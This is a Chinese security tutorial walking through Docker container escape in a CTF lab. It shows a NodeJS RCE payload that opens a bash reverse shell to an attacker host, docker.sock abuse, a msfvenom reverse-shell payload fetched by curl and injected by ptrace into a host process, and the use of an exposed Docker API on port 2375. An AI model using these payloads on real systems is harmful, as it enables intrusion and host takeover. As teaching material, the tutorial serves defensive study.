原创： Lee2dog 合天智汇

## 一、攻击Docker容器-场景  

在上一篇文章中攻击和审计Docker容器01，介绍了Docker容器的基础知识，在本篇文章中，我们将介绍通过攻击容器从而访问主机的系统，数据和资源。

主要有以下几种攻击场景：

1、攻击容器的Capabilities（Capability 能力限制）

2、攻击不安全的数据卷挂载

3、攻击运行环境的错误配置

4、利用docker secrets 错误配置

### 什么是Docker Escape？  

通过利用Docker漏洞，弱点使攻击者能够绕过容器运行时的各种限制获取主机的权限、数据和资源。

如果攻击者能够在容器内执行任意命令，并且能够在主机**问资源或执行命令，而不受容器命名空间的限制，则会产生逃逸。

> 在本节中，我们假设攻击者已经通过利用部署在容器内应用的某些漏洞获取了在容器内执行命令的权限。  
>

## 二、攻击场景一：不安全的数据卷挂载  

在这个场景中，我们将利用NodeJS应用，使用远程代码执行漏洞来获取反向shell，然后通过挂载的docker.sock数据卷获得宿主机权限。

应用程序运行在 CTF-VM上，可以通过http://CTF-VMIP访问

![v2-d186e6035745b8a49daf057f68e984e3_hd.p](https://pic3.zhimg.com/80/v2-d186e6035745b8a49daf057f68e984e3_hd.png)

此NodeJS应用的q参数在GET方法中存在远程代码执行攻击漏洞。使用http://CTF-VMIP/?q="docker"访问。

![v2-6a87e705ee0969aeffdc989ea5b7456b_hd.p](https://pic2.zhimg.com/80/v2-6a87e705ee0969aeffdc989ea5b7456b_hd.png)

通过这个，我们可以获得一个反弹shell，payload如下：

require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/studentVMIP/5555
0>%261"')

在studentVM上开启一个监听

student@debian:~$ nc -lvp 5555Listening on [0.0.0.0] (family 0, port 5555)

执行payload

http://CTF-VMIP/?q=require("child_process").exec('bash -c "bash -i >%26
/dev/tcp/studentVMIP/5555 0>%261"')

![v2-250acb5ddd92c86707a86eaab2b1bcee_hd.p](https://pic3.zhimg.com/80/v2-250acb5ddd92c86707a86eaab2b1bcee_hd.png)

在studentVM上就能得到一个反弹的shell

student@debian:~$ nc -lvp 5555Listening on [0.0.0.0] (family 0, port
5555)Connection from [192.168.224.129] port 5555 [tcp/*] accepted (family 2,
sport 49614)bash: cannot set terminal process group (15): Inappropriate ioctl
for devicebash: no job control in this shellroot@9c87389b1761:/usr/src/app#

我们已经获得了容器的shell

student@debian:~$ nc -lvp 5555Listening on [0.0.0.0] (family 0, port
5555)Connection from [192.168.224.129] port 5555 [tcp/*] accepted (family 2,
sport 49614)bash: cannot set terminal process group (15): Inappropriate ioctl
for devicebash: no job control in this shellroot@9c87389b1761:/usr/src/app#
ididuid=0(root) gid=0(root) groups=0(root)root@9c87389b1761:/usr/src/app#

查看dockser.sock挂载的情况

root@9c87389b1761:/usr/src/app# ls -l /var/run/docker.sock ls -l
/var/run/docker.socksrw-rw---- 1 root 999 0 Nov 14 16:44
/var/run/docker.sockroot@9c87389b1761:/usr/src/app#

我们可以看到宿主机的docker.sock被挂载到了容器里面。

这使得攻击者能够通过UNIX套接字使用docker客户端调用主机上的选项访问宿主机的docker服务。

docker客户端已经下载到容器中，位于/root/docker

root@9c87389b1761:/usr/src/app# cd /root/dockercd
/root/dockerroot@9c87389b1761:~/docker# ls -lls -ltotal 143500-rwxr-xr-x 1
node node 37579846 Jul 18 2018 docker-rwxr-xr-x 1 node node 26385560 Jul 18
2018 docker-containerd-rwxr-xr-x 1 node node 14725592 Jul 18 2018 docker-containerd-ctr-rwxr-xr-x 1 node node 4173632 Jul 18 2018 docker-containerd-shim-rwxr-xr-x 1 node node 764144 Jul 18 2018 docker-init-rwxr-xr-x 1 node
node 2837280 Jul 18 2018 docker-proxy-rwxr-xr-x 1 node node 7495056 Jul 18
2018 docker-runc-rwxr-xr-x 1 node node 52969368 Jul 18 2018
dockerdroot@9c87389b1761:~/docker#

使用UNIX套接字访问主机资源：

root@9c87389b1761:~/docker# ./docker -H unix:///var/run/docker.sock ps./docker
-H unix:///var/run/docker.sock psCONTAINER ID IMAGE COMMAND CREATED STATUS
PORTS NAMES9c87389b1761 appsecco/node-simple-rce "pm2 start app.js --…" 15
months ago Up 12 hours 0.0.0.0:80->8080/tcp nodeappfefeff8e1078 sysmon "top"
15 months ago Up 12 hours sysmonroot@9c87389b1761:~/docker#
root@9c87389b1761:~/docker# ./docker -H unix:///var/run/docker.sock
images./docker -H unix:///var/run/docker.sock imagesREPOSITORY TAG IMAGE ID
CREATED SIZEsysmon latest e9d165cf1cd6 15 months ago 139MBubuntu latest
735f80812f90 15 months ago 83.5MBalpine latest 11cd0b38bc3c 16 months ago
4.41MBappsecco/node-simple-rce latest da4154bb4bcf 2 years ago
253MBappsecco/dsvw <none> ccc88f3dc27d 2 years ago
48.2MBroot@9c87389b1761:~/docker#

可以看到，我们拥有了对宿主机的权限。

## 三、理解命名空间  

3.1 Namespaces

Docker使用Linux命名空间为容器提供隔离的运行环境。在容器运行时，Docker将为该容器创建一组命名空间。它会创建六种namespace，然后把容器内的所有进程放到这些namespace中。

1、PID namespace：进程ID空间

2、NET namespace：网络相关资源，管理网络

3、IPC namespace：特定进程间的通信资源空间，管理对IPC资源的访问

4、MNT namespace：管理文件系统挂载点

5、UTS namespace：每个容器可以有自己的hostname和domainname

6、USER namespace：用户和组ID空间

3.2 Namespace 演示

student@debian:~$ docker run --rm -d alpine sleep
11166f01491cd2c724226dd4f879a4dc56c77bfa9af999eca5926c4cf88fa309704student@debian:~$
ps aux | grep 'sleep 111'root 6674 0.0 0.0 1516 4 ? Ss 10:55 0:00 sleep
111student 6721 0.0 0.1 14224 1092 pts/1 S+ 10:56 0:00 grep --color=auto sleep
111student@debian:~$ sudo ls /proc/6674/ns/cgroup ipc mnt net pid user
utsstudent@debian:~$

3.3 PID namespace

PID namespace隔离进程ID空间，这样不同的PID命名空间中的进程可以具有相同的PID

PID namespace允许容器提供暂停/恢复容器中一组进程以及将容器迁移到新主机而容器中的进程保持同的PID等功能

> 比如，当我们运行一个 nginx 容器，nginx进程在容器内的PID 总是 1，但在主机上的PID是不同的，比如 2198  
>

示例：

student@debian:~$ docker run --rm --name=samplewebapp1 -d
nginx:alpine230d2d9b384642087f7a14ded23cf524908d84b68da47ae0091812dfc9a175afstudent@debian:~$
ps auxxx | grep nginxroot 6899 0.3 0.3 13804 3776 ? Ss 11:09 0:00 nginx:
master process nginx -g daemon off;systemd+ 6939 0.0 0.1 14260 1824 ? S 11:09
0:00 nginx: worker processstudent 6941 0.0 0.0 14224 968 pts/1 S+ 11:09 0:00
grep --color=auto nginxstudent@debian:~$ docker exec -it samplewebapp1 sh/ #
ps auxxx | grep nginx 1 root 0:00 nginx: master process nginx -g daemon off; 6
nginx 0:00 nginx: worker process 13 root 0:00 grep nginx/ #
exitstudent@debian:~$ docker run --rm --name=samplewebapp2 -d
nginx:alpine3e461d4c687914e06c790f0160420da068384b41b4fc57b3b54ecaf7becf3d12student@debian:~$
ps auxxx | grep nginxroot 6899 0.0 0.3 13804 3776 ? Ss 11:09 0:00 nginx:
master process nginx -g daemon off;systemd+ 6939 0.0 0.1 14260 1824 ? S 11:09
0:00 nginx: worker processroot 7067 1.0 0.3 13804 3400 ? Ss 11:10 0:00 nginx:
master process nginx -g daemon off;systemd+ 7109 0.0 0.1 14260 1944 ? S 11:10
0:00 nginx: worker processstudent 7116 0.0 0.0 14224 1012 pts/1 S+ 11:10 0:00
grep --color=auto nginxstudent@debian:~$ docker exec -it samplewebapp2 sh/ #
ps auxxx | grep nginx 1 root 0:00 nginx: master process nginx -g daemon off; 6
nginx 0:00 nginx: worker process 13 root 0:00 grep nginx/ #

![v2-30059d92885ccdb1566d9fd1d0317a35_hd.p](https://pic1.zhimg.com/80/v2-30059d92885ccdb1566d9fd1d0317a35_hd.png)

![v2-09bc***4aa0fbafc554f3224e4924855_hd.p](https://pic1.zhimg.com/80/v2-09bc***4aa0fbafc554f3224e4924855_hd.png)

可以看到两个进程在主机中具有不同的PID，但在容器中都使用了PID 1

3.4 附加主机进程到容器中

我们可以使用--pid参数将主机进程空间或者其他容器的进程空间附加到容器中。

![v2-b6714d25cddd833b363f75953834d5c8_hd.p](https://pic1.zhimg.com/80/v2-b6714d25cddd833b363f75953834d5c8_hd.png)

## 四、理解Capabilities  

Linux
Capabilities可以提供二进制程序运行时更详细的访问控制。比如允许非root进程绑定1024以下的低位端口。比如Web服务器不需要以Root身份运行，只需要授予它们net_bind_service能力即可。

> 从2.2版本的内核开始，Linux将传统上与超级用户相关的特权化为不同的单元，称为capabilities，可以独立的启用和禁用。  
>

4.1 Capabilities 演示

1、运行一个ping 命令容器

student@debian:~$ docker run --rm -it alpine sh/ # ping 127.0.0.1 -c 2PING
127.0.0.1 (127.0.0.1): 56 data bytes64 bytes from 127.0.0.1: seq=0 ttl=64
time=0.068 ms64 bytes from 127.0.0.1: seq=1 ttl=64 time=0.070 ms \---127.0.0.1 ping statistics ---2 packets transmitted, 2 packets received, 0%
packet lossround-trip min/avg/max = 0.068/0.069/0.070 ms/ #

2、现在我们移除CAP_NET_RAW能力，再运行试试

student@debian:~$ docker run --rm -it --cap-drop=NET_RAW alpine sh/ # ping
127.0.0.1 -c 2PING 127.0.0.1 (127.0.0.1): 56 data bytesping: permission denied
(are you root?)/ #

可以看到提示权限限制。

4.2 检查 capabilities list

命令：capsh --print

student@debian:~$ docker run --rm -it 71aa5f3f90dc bashroot@57f97d01c14d:/#
capsh --printCurrent: =
cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eipBounding
set
=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcapSecurebits:
00/0x0/1'b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no
(unlocked)uid=0(root)gid=0(root)groups=root@57f97d01c14d:/#

4.3 以完全特权模式运行容器

student@debian:~$ docker run --rm -it --privileged=true 71aa5f3f90dc
bashroot@743a6ea4ae16:/# capsh --printCurrent: =
cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eipBounding
set
=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37Securebits:
00/0x0/1'b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no
(unlocked)uid=0(root)gid=0(root)groups=root@743a6ea4ae16:/#

可以使用 more /dev/kmsg从特权容器访问主机设备

root@743a6ea4ae16:/# more /dev/kmsg6,0,0,-;Initializing cgroup subsys
cpuset6,1,0,-;Initializing cgroup subsys cpu6,2,0,-;Initializing cgroup subsys
cpuacct5,3,0,-;Linux version 4.4.0-116-generic (buildd@lgw01-amd64-021) (gcc
version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9) ) #140-Ubuntu SMP Mon
Feb 12 21:23:04 UTC 2018 (Ubuntu 4.4.0-116.140-generic 4.4.98)6,4,0,-;Command
line: BOOT_IMAGE=/boot/vmlinuz-4.4.0-116-generic
root=UUID=a1e18847-a1b7-4f44-b363-8595dc8d140e ro6,5,0,-;KERNEL supported
cpus:6,6,0,-; Intel GenuineIntel6,7,0,-; AMD AuthenticAMD6,8,0,-; Centaur
CentaurHauls6,9,0,-;Disabled fast string operations

> /dev/kmsg这个字符设备节点向用户空间的程序提供了访问内核printk缓冲器的接口  
>

## 五、攻击场景二：容器 Capabilities  

在这个场景中，我们将利用使用主机pid
namespace运行且具有sys_ptrace能力的容器，我们假设攻击者已经可以访问容器了，我们将利用这些漏洞入侵容器并访问宿主机系统资源。

5.1 登录到CTF-VM

执行如下命令进入容器中

ctf@debian:~$ docker exec -it sysmon bashroot@fefeff8e1078:/# iduid=0(root)
gid=0(root) groups=0(root)root@fefeff8e1078:/#

5.2 检查能力列表

root@fefeff8e1078:/# capsh --printCurrent: =
cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+eipBounding
set
=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcapSecurebits:
00/0x0/1'b0 secure-noroot: no (unlocked) secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no
(unlocked)uid=0(root)gid=0(root)groups=root@fefeff8e1078:/#

5.3 查看主机进程

容器还启用了pid=host，这样的话，我们可以使用top命令查看宿主机的进程

![v2-8976ee015624817949214fe3f9db475e_hd.p](https://pic1.zhimg.com/80/v2-8976ee015624817949214fe3f9db475e_hd.png)

因为攻击者可以查看主机进程并具有sys_ptrace能力。攻击者可以利用这点从任意主机进程的地址空间注入或执行代码。

因为攻击者可以在容器外执行代码，所以导致了docker逃逸。

5.4 攻击步骤

1、使用msfvenom生成一个反弹shell payload。

msfvenom -p linux/x64/shell_reverse_tcp LHOST=student-VMIP LPORT=4444 -f raw
-o payload.bin

student@debian:~$ cd /home/student/linux-injector/student@debian:~/linux-injector$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.224.128
LPORT=4444 -f raw -o payload.bin[-] No platform was selected, choosing
Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting
arch: x64 from the payloadNo encoder or badchars specified, outputting raw
payloadPayload size: 74 bytesSaved as: payload.binstudent@debian:~/linux-injector$

2、使用python启动一个web服务器传送我们的payload

student@debian:~$ cd /home/student/student@debian:~$ tar -czf linux-injector.tar.gz linux-injectorstudent@debian:~$ python -m SimpleHTTPServer
8002Serving HTTP on 0.0.0.0 port 8002 ...

3、在CTF-VM中下载payload

root@fefeff8e1078:/# curl -o linux-injector.tar.gz
http://192.168.224.128:8002/linux-injector.tar.gz % Total % Received % Xferd
Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100
129k 100 129k 0 0 11.5M 0 --:--:-- --:--:-- --:--:-- 12.6Mroot@fefeff8e1078:/#
tar xzf linux-injector.tar.gz root@fefeff8e1078:/# cd linux-injectorroot@fefeff8e1078:/linux-injector# chmod 755 injector
root@fefeff8e1078:/linux-injector#

4、在student-VM中执行nc开启端口监听

student@debian:~$ nc -lvp 4444Listening on [0.0.0.0] (family 0, port 4444)

5、现在在CTF-VM的容器中，找一个具有root权限的宿主机进程进行注入，把payload注入进去。

root@fefeff8e1078:/linux-injector# ps -auxxx | grep root | grep pingroot 692
0.0 0.3 53728 3292 ? Ss Nov14 0:00 /usr/bin/sudo /bin/ping 127.0.0.1root 732
0.0 0.0 6536 736 ? S Nov14 0:04 /bin/ping 127.0.0.1root 3888 0.0 0.1 11464
1104 pts/1 S+ 06:41 0:00 grep --color=auto pingroot@fefeff8e1078:/linux-injector# ./injector 732 payload.bin Injecting into target process 732[*]
[inject_code] Attached to process[*] [wait_stopped] Process stopped with
signal 19[*] [inject_code] Process is in stopped state[*] [wait_stopped]
Process stopped with signal 5[*] [ptrace_next_syscall] EAX after syscall:
-38[*] [wait_stopped] Process stopped with signal 5[*] [ptrace_next_syscall]
EAX after syscall: 0[*] [inject_code] Process exited from syscall[*]
[_save_state] Saved registers[*] [_save_state] Saved 128 bytes from EIP
0x15479e0[*] [inject_code] Saved state of target process[*] [_mmap_data] Wrote
our shellcode parameters into process registers[*] [_mmap_data] Wrote mmap
code to EIP 0x7efccc8ab730[*] [ptrace_continue] Continuing execution of target
process 732[*] [_wait_trap] Process stopped with signal 5[*] [_mmap_data]
Mmap() finished execution[*] [_mmap_data] Mmap() returned 0x7efcccfa4000[*]
[_mmap_data] Restored registers of target process[*] [inject_code] Allocated
space for payload at location 0x7efcccfa4000[*] [inject_code] Wrote payload to
target process at address 0x7efcccfa4000[*] [_mmap_data] Wrote our shellcode
parameters into process registers[*] [_mmap_data] Wrote mmap code to EIP
0x7efccc8ab730[*] [ptrace_continue] Continuing execution of target process
732[*] [_wait_trap] Process stopped with signal 5[*] [_mmap_data] Mmap()
finished execution[*] [_mmap_data] Mmap() returned 0x7efcccfa3000[*]
[_mmap_data] Restored registers of target process[*] [inject_code] Allocated
new stack at location 0x7efcccfa4000[*] [_mmap_data] Wrote our shellcode
parameters into process registers[*] [_mmap_data] Wrote mmap code to EIP
0x7efccc8ab730[*] [ptrace_continue] Continuing execution of target process
732[*] [_wait_trap] Process stopped with signal 5[*] [_mmap_data] Mmap()
finished execution[*] [_mmap_data] Mmap() returned 0x7efcccfa2000[*]
[_mmap_data] Restored registers of target process[*] [inject_code] Allocated
space for code cave at location 0x7efcccfa2000[*] [inject_code] Launching
payload in new thread[*] [_launch_payload] Wrote our shellcode parameters into
process registers. EIP: 0x7efcccfa2000[*] [_launch_payload] Wrote clone
trampoline code to address 0x7efcccfa2000[*] [ptrace_continue] Continuing
execution of target process 732[*] [_wait_trap] Process stopped with signal
5[*] [_launch_payload] Clone() finished execution[*] [_launch_payload] New
thread ID: 3890[*] [_launch_payload] Successfully launched payload[*]
[_restore_state] Restored registers[*] [_restore_state] Restored 128 bytes to
EIP 0x15479e0Code injection successful root@fefeff8e1078:/linux-injector#

6、看到注入成功了，回到student-VM中，可以看到获得了一个shell

student@debian:~$ nc -lvp 4444Listening on [0.0.0.0] (family 0, port
4444)Connection from [192.168.224.129] port 4444 [tcp/*] accepted (family 2,
sport 36060)iduid=0(root) gid=0(root) groups=0(root)ip addr1: lo:
<LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default
qlen 1 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8
scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host
valid_lft forever preferred_lft forever2: ens33:
<BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group
default qlen 1000 link/ether 00:0c:29:d1:0c:e8 brd ff:ff:ff:ff:ff:ff inet
10.1.1.146/24 brd 10.1.1.255 scope global ens33 valid_lft forever
preferred_lft forever inet6 fe80::20c:29ff:fed1:ce8/64 scope link valid_lft
forever preferred_lft forever3: ens34: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu
1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether
00:0c:29:d1:0c:f2 brd ff:ff:ff:ff:ff:ff inet 192.168.224.129/24 brd
192.168.224.255 scope global ens34 valid_lft forever preferred_lft forever
inet6 fe80::20c:29ff:fed1:cf2/64 scope link valid_lft forever preferred_lft
forevercat /root/flag.txtCongratulations! You escaped Docker container

## 六、攻击场景三：利用docker错误配置  

在这个场景中，docker错误的配置了docker远程API端口2375的访问。我们将利用它获取主机的权限、访问其他容器和镜像。

> Docker daemon 可以通过三种不同类型的套接字：unix、tcp、fd来侦听docker
> 引擎的API请求。如果想通过远程访问，需要启用tcp套接字。默认情况下，docker remote api
> 使用的端口2375提供未加密和未授权的方式直接访问docker daemon。如果要配置加密访问则使用端口2376  
>

6.1 扫描端口

在student-VM上使用nmap扫描目标端口

student@debian:~$ nmap -p 2375,2376 -n 192.168.224.129 -v Starting Nmap 7.01 (
https://nmap.org ) at 2019-11-15 12:34 ISTInitiating Ping Scan at
12:34Scanning 192.168.224.129 [2 ports]Completed Ping Scan at 12:34, 0.00s
elapsed (1 total hosts)Initiating Connect Scan at 12:34Scanning
192.168.224.129 [2 ports]Discovered open port 2375/tcp on
192.168.224.129Completed Connect Scan at 12:34, 0.00s elapsed (2 total
ports)Nmap scan report for 192.168.224.129Host is up (0.00032s latency).PORT
STATE SERVICE2375/tcp open docker2376/tcp closed docker Read data files from:
/usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 0.07
secondsstudent@debian:~$

可以看到目标的2375端口是开放的。

6.2 查询docker api

student@debian:~$ curl 192.168.224.129:2375/images/json | jq . % Total %
Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent
Left Speed100 1686 100 1686 0 0 143k 0 --:--:-- --:--:-- --:--:-- 149k[ {
"Containers": -1, "Created": 1533141463, "Id":
"sha256:e9d165cf1cd65ab81f8fa04abcb19700040081fcaa4aef7eb20dcc96a4ce3bba",
"Labels": { "MAINTAINER": "Madhu Akula" }, "ParentId":
"sha256:d980faf456051587396f00a5d318fa2715e739dde263d313117a8adfd2e52e02",
"RepoDigests": null, "RepoTags": [

6.3 管理远程主机上的docker

student@debian:~$ docker -H tcp://CTF-VMIP:2375 psstudent@debian:~$ docker -H
tcp://CTF-VMIP:2375 images

![v2-2c66612758296e64f9abff9496c31513_hd.p](https://pic3.zhimg.com/80/v2-2c66612758296e64f9abff9496c31513_hd.png)

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

